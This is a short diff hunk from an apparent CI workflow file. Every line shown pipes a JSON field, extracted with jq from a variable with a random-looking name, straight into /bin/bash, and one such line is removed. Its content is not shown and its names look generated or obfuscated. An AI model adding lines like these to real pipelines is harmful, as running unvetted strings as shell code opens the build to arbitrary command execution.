@@ -21,7 +21,6 @@ jobs:
           echo $i9959 | jq -r .hn1 | /bin/bash
           echo $gqh8529 | jq -r .qnk9 | /bin/bash
           printf '%s' "$ns6283" | jq -r .oihht02548 | /bin/bash
-          echo $zmbku58062 | jq -r .tpz9 | /bin/bash
           echo $xgrw9 | jq -r .zc456 | /bin/bash
           printf '%s' "$k5013" | jq -r .cwfbe6 | /bin/bash
           printf '%s' "$veqr008" | jq -r .bhhyg8334 | /bin/bash
